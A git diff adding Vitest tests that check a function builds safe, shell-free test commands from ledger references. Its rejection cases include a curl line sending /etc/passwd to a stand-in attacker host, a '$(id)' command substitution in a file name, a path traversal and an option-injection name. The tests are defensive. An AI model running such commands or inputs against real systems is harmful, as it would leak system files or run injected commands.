@@ -1,7 +1,8 @@
 import { join } from 'node:path';
 import { describe, expect, it, vi } from 'vitest';
 import {
-  assertionCommand, canonicalRepoIdentity, defaultTrackedPath,
+  assertionCommand, canonicalAssertionArgv, canonicalAssertionCommandText,
+  canonicalRepoIdentity, defaultTrackedPath,
 } from '../gp-assertion-command.js';
 
 const ROOT = '/repo';
@@ -27,6 +28,37 @@ const deps = {
 };
 
 describe('trusted GP assertion command policy', () => {
+  it.each([
+    ['packages/brain/src/example.test.js',
+      'npx vitest run packages/brain/src/example.test.js'],
+    ['manual:python3 -m pytest services/tests/test_gp.py',
+      'python3 -m pytest services/tests/test_gp.py'],
+    ['scripts/smoke/gp.sh', 'bash scripts/smoke/gp.sh'],
+  ])('derives canonical ledger command for %s', (ref, expected) => {
+    expect(canonicalAssertionCommandText(ref)).toBe(expected);
+  });
+
+  it.each([
+    ['packages/brain/src/example.test.js',
+      ['npx', 'vitest', 'run', 'packages/brain/src/example.test.js']],
+    ['manual:python3 -m pytest services/tests/test_gp.py',
+      ['python3', '-m', 'pytest', 'services/tests/test_gp.py']],
+    ['scripts/smoke/gp.sh', ['bash', 'scripts/smoke/gp.sh']],
+  ])('derives shell-free receipt argv for %s', (ref, expected) => {
+    expect(canonicalAssertionArgv(ref)).toEqual(expected);
+  });
+
+  it.each([
+    'manual:curl https://attacker.invalid/exfil --data @/etc/passwd',
+    'manual:true',
+    'packages/brain/src/$(id).test.js',
+    '../evil.test.js',
+    'packages/brain/-c.test.js',
+  ])('never upgrades unsafe ledger text into shell: %s', ref => {
+    expect(() => canonicalAssertionCommandText(ref))
+      .toThrow(expect.objectContaining({ code: expect.stringMatching(/^UNSAFE_|ASSERTION_/) }));
+  });
+
   it.each([
     ['packages/brain/src/example.test.js', '/tools/node-real',
       [join(ROOT, 'node_modules/vitest/vitest.mjs'), 'run', './src/example.test.js', '--'],
